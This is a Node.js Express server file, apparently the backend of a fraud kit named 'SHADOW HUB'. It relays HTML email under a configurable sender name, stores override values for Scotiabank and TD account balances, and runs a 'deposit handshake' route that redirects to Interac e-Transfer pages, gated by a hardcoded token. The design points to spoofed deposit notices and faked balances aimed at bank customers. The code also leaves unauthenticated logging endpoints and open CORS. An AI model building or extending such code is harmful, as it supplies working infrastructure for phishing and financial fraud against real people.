
import express from 'express';
import cors from 'cors';
import bodyParser from 'body-parser';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import crypto from 'crypto';

// Modular Services
import { db } from './services/db.js';
import { mailer } from './services/mailer.js';
import { ai } from './services/ai.js';

const envLocalPath = path.resolve(process.cwd(), '.env.local');
if (fs.existsSync(envLocalPath)) dotenv.config({ path: envLocalPath });
else dotenv.config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(bodyParser.json());

// --- SECURITY ARMOR MIDDLEWARE ---
app.use((req, res, next) => {
    res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
    next();
});

// --- AUTHORIZATION GUARD ---
const authorizeRequest = (req, res, next) => {
    const token = req.query.token || req.headers['x-access-token'] || req.body.token;
    if (token !== 'projectsarah') {
        return res.status(403).json({ 
            success: false, 
            error: "UNAUTHORIZED_UPLINK", 
            message: "Missing or invalid Project Sarah token." 
        });
    }
    next();
};

// --- LOG HUB (SSE) ---
let clients = [];
app.get('/api/stream/logs', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.flushHeaders();

    const clientId = Date.now();
    clients.push({ id: clientId, res });
    req.on('close', () => clients = clients.filter(c => c.id !== clientId));
});

export const broadcastEvent = (type, message, meta = {}) => {
    const origin = meta.origin || 'JS_CORE';
    const data = JSON.stringify({ timestamp: Date.now(), type, message, meta, origin });
    clients.forEach(c => { try { c.res.write(`data: ${data}\n\n`); } catch (e) {} });
    db.logEvent(type, message, { ...meta, origin });
};

// --- API ROUTES ---

app.get('/api/status', (req, res) => {
    const config = db.get('system_config') || {};
    const uplinks = db.get('uplinks', []);

    res.json({
        status: "operational",
        version: "SHADOW_CORE_V99",
        bot_active: !!config.telegram?.enabled,
        uplink_count: uplinks.length,
        uplinks: uplinks,
        metrics: {
            node_entropy: ((Math.random() * 0.05)).toFixed(4) + "%",
            booster_protocol: "Active",
            satellite_lock: true,
            scotia_override: db.get('scotia_balance_override'),
            td_override: db.get('td_balance_override'),
            sender_override: config.general?.sender_name || 'SHADOW_USER'
        }
    });
});

// Unified Mailer Logic
const handleMailerDispatch = async (req, res) => {
    try {
        const result = await mailer.dispatch(req.body);
        res.json({
            ...result,
            path: 'NEXUS_JS_NODE'
        });
    } catch (err) {
        broadcastEvent('MAIL_CRITICAL', err.message, { origin: 'JS_CORE' });
        res.status(500).json({ success: false, message: err.message, path: 'NEXUS_JS_NODE' });
    }
};

// UPDATED: Added /api/mailer to support all variations of the corridor URLs
app.post(['/api/mailer', '/api/mailer.php', '/api/py/mailer'], authorizeRequest, handleMailerDispatch);

// Deposit Handshake Route
app.get('/api/handshake', (req, res) => {
    const { tx, token } = req.query;
    if (token !== 'projectsarah') {
        return res.redirect('https://etransfer.interac.ca/error');
    }
    res.redirect(`/?tx=${tx}&token=projectsarah`);
});

// Diagnostic Debug Relay
app.post(['/api/mailer-debug.php', '/api/py/mailer/debug'], authorizeRequest, async (req, res) => {
    const { to, subject, body } = req.body;
    try {
        const config = db.get('system_config');
        if (!config || !config.smtp) {
            throw new Error('System configuration not found. Please update Settings first.');
        }

        const transporter = await mailer.createTransporter({ 
            name: 'DEBUG_RELAY', 
            conf: config.smtp, 
            type: 'smtp' 
        });
        
        if (!transporter) throw new Error('Primary SMTP relay not configured correctly.');

        await transporter.sendMail({
            from: `"${config.general.sender_name}" <${config.smtp.username}>`,
            to,
            subject: subject || "Debug Signal",
            html: body || "Diagnostic message content."
        });
        
        broadcastEvent('DEBUG_SIGNAL_SUCCESS', `Direct signal accepted by ${config.smtp.host}`);
        res.json({ success: true, message: "Signal dispatched via diagnostic bridge." });
    } catch (err) {
        broadcastEvent('DEBUG_SIGNAL_FAILURE', err.message);
        res.status(500).json({ success: false, message: err.message });
    }
});

app.post('/api/internal/log', (req, res) => {
    const { type, message, meta, origin } = req.body;
    broadcastEvent(type, message, { ...meta, origin });
    res.json({ success: true });
});

app.post('/api/py/config', authorizeRequest, (req, res) => {
    const { config } = req.body;
    db.set('system_config', config);
    broadcastEvent('CONFIG_SYNC', 'System state committed to local disk.');
    res.json({ success: true });
});

// Static Assets
const distPath = path.join(__dirname, '../dist');
if (fs.existsSync(distPath)) {
    app.use(express.static(distPath));
}

// Fallback JSON error handler for missing /api routes
app.use('/api', (req, res) => {
    res.status(404).json({
        success: false,
        error: "ENDPOINT_NOT_FOUND",
        message: `The path ${req.path} is not registered in the Logic Core.`
    });
});

app.get('*', (req, res) => {
    if (fs.existsSync(path.join(distPath, '../index.html'))) {
        res.sendFile(path.join(distPath, '../index.html'));
    } else {
        res.status(503).send("System build artifacts not found.");
    }
});

app.listen(PORT, () => console.log(`🚀 SHADOW HUB Online on ${PORT}`));
